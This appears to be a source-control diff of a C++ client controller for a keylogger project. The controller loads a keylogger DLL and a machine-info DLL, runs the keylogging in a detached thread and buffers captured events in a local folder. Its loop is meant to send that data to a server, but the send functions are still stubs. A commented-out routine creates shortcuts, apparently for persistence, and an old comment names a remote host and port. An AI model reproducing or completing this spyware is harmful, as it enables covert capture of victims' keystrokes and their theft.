@@ -14,17 +14,15 @@ clientController::clientController(void) throw(DLibraryException)
 	// Specify libraries PATH
 	//////////////////////////////////////////////////////
 
-	#ifdef __linux__
-		this->libraries.add(1, "dataHandler", "./libdataHandler.so");
-	#elif _WIN32
-		this->libraries.add(1, "sayHello", "sayHello.dll");
-		this->libraries.add(2, "infoClient", "InfoClient.dll");
-		this->libraries.add(3, "keylogger_dll", "keylogger_dll.dll");
-		this->libraries.add(4, "dataHandler", "dataHandler.dll");
+	this->libraries.add(1, "sayHello", "sayHello.dll");
+	this->libraries.add(2, "workQueueManager", "workQueueManager.dll");
+	this->libraries.add(3, "infoClient", "InfoClient.dll");
+	this->libraries.add(4, "keylogger_dll", "keylogger_dll.dll");
+	this->libraries.add(5, "dataHandler", "dataHandler.dll");
 
-		this->bytePerFile = 4;
-		this->storeFolder = "C:\\\\spider\\";
-	#endif
+	this->quit = false;
+	this->bytePerFile = 4;
+	this->storeFolder = "C:\\\\spider\\";
 
 
 	//////////////////////////////////////////////////////
@@ -41,22 +39,29 @@ clientController::clientController(void) throw(DLibraryException)
 	// Get dictionaries and instanciate tools
 	//////////////////////////////////////////////////////
 
-	if (!(this->sayHello = this->libraries.handler.getDictionaryByName("sayHello")))
+	// Say Hello
+	if (!(this->dictSayHello = this->libraries.handler.getDictionaryByName("sayHello")))
 		throw DLibraryException("sayHello", "Couldn't get Dictionary.");
 
-	#ifdef _WIN32
-	if (!(this->infoClient = this->libraries.handler.getDictionaryByName("infoClient")))
+	// Work Queue Manager
+	if (!(this->dictWorkQueueManager = this->libraries.handler.getDictionaryByName("workQueueManager")))
+		throw DLibraryException("workQueueManager", "Couldn't load thread module");
+	this->eventQueue = ((_getAWorkQueue)(*this->dictWorkQueueManager)["getAWorkQueue"])();
+
+	// Info Client
+	if (!(this->dictInfoClient = this->libraries.handler.getDictionaryByName("infoClient")))
 		throw DLibraryException("infoClient", "Couldn't get ClassInstance");
-	this->ifinstance = ((_getInstance)(*this->infoClient)["getInstance"])();
+	this->infoClient = ((_getInstance)(*this->dictInfoClient)["getInstance"])();
 
-	if (!(this->keylogger_dll = this->libraries.handler.getDictionaryByName("keylogger_dll")))
+	// KeyLogger
+	if (!(this->dictKeyLogger = this->libraries.handler.getDictionaryByName("keylogger_dll")))
 		throw DLibraryException("keylogger_dll", "Couldn't get Dictionary.");
-	this->klinstance = ((_instantiate)(*this->keylogger_dll)["instantiate"])(std::ref(this->_lwqueue));
-	#endif
 
+	// DataHandler
 	if (!(this->dictDataHandler = this->libraries.handler.getDictionaryByName("dataHandler")))
 		throw DLibraryException("dataHandler", "Couldn't get Dictionary.");
 	this->dataHandler = ((_getDataHandler)(*this->dictDataHandler)["getDataHandler"])();
+	this->dataHandler->fileHandler->initStream(this->storeFolder, this->bytePerFile);
 }
 
 clientController::~clientController(void)
@@ -64,58 +69,88 @@ clientController::~clientController(void)
 	this->libraries.handler.closeList();
 }
 
+
 /////////////////////////////////////////////////////////////////
-//  SCENARIO ( ACTIONS )
+//  CONDUCTOR ( mainAction )
 /////////////////////////////////////////////////////////////////
 
-int		clientController::mainAction(int ac, char **av)
+int				clientController::mainAction(int ac, char **av)
 {
+	std::string	serialized;
+	std::thread	threadKeyLogging(&clientController::keyLoggerThread, this);
 
-	// Try to get what was written before
-	this->dataHandler->fileHandler->initStream(this->storeFolder, this->bytePerFile);
-	// this->dataHandler->fileHandler->insertDataToStream("This is one data");
-	// this->dataHandler->fileHandler->insertDataToStream("This is another data");
-	// this->sendLocalDataAction();
+	while (!this->quit)
+	{
+		this->sendLocalDataAction();
+		serialized = this->serializeQueueAction();
+		if (!this->sendPacketAction(new Packet(0, 101, true, serialized.size(), "serialized.c_str()")))
+			this->storeEventAction(serialized);
+	}
 
-	this->defineShortcut();
-	this->klinstance->init();
-	std::cout << this->ifinstance->getMacAddr() << std::endl;
-
-	// Faire pleins de trucs :
-	// this->dhinstance->init();
-
-	// _lqueue = this->dhinstance->getLocaleQueue();
-	// this->netinstance->init("shad.pro", 1234);
-	// this->netinstance->auth(ifinstance->routine());
-	// this->dhinstance->setNetQueue(this->netinstance->getQueue());
-	//std::thread keylogging(klinstance->run());
-	//std::thread datahandling(dhinstance->routine());
-	//std::thread networking(netinstance->routine(_lqueue));
-	// keylog.join();
-	// datahandling.join();
-	// networking.join();
-	
-	// keylogger_test
-
-	system("pause");
-
+	threadKeyLogging.detach();
 	return (0);
 }
+
+
+/////////////////////////////////////////////////////////////////
+//  THREADED ACTIONS
+/////////////////////////////////////////////////////////////////
+
+void	clientController::keyLoggerThread(void)
+{
+	this->keyLogger = ((_instantiate)(*this->dictKeyLogger)["instantiate"])(this->eventQueue);
+	this->keyLogger->init();
+	this->keyLogger->run();
+}
+
+
+/////////////////////////////////////////////////////////////////
+//  ITERATIVE ACTIONS
+/////////////////////////////////////////////////////////////////
 
 bool			clientController::sendLocalDataAction(void)
 {
 	std::string	buffer;
 
+	std::cout << "Send local data" << std::endl;
 	buffer = this->dataHandler->fileHandler->extractDataFromStream(10);
 	while (buffer.size())
 	{
-		// Here we can send buffer to server
-		std::cout << "[BUFFER] : " << buffer << std::endl;
+		// SEND BUFFER TO SERVER HERE ...
+		// VERIFY BEFORE ERASING !
 		this->dataHandler->fileHandler->removeLocalData(10);
 		buffer = this->dataHandler->fileHandler->extractDataFromStream(10);
 	}
 	return (true);
 }
+
+std::string	clientController::serializeQueueAction(void)
+{
+	// TO-DO
+	std::cout << "serialize event ..." << std::endl;
+	return (std::string(""));
+}
+
+bool		clientController::sendPacketAction(Packet *packet)
+{
+	// TO-DO
+	std::cout << "send packet ..." << std::endl;
+	return (true);
+}
+
+bool		clientController::storeEventAction(std::string serialized)
+{
+	this->dataHandler->fileHandler->insertDataToStream(serialized);
+	return (true);
+}
+
+
+
+
+
+/*
+
+	--> A Quoi Sert Ce Code ?
 
 void	clientController::defineShortcut(void) {
 	LPCSTR module = new char[MAX_PATH];
@@ -152,3 +187,4 @@ bool clientController::createShortcut(LPCSTR lpszPathObj, LPCWSTR lpszPathLink, 
 	}
 	return SUCCEEDED(hres);
 }
+*/
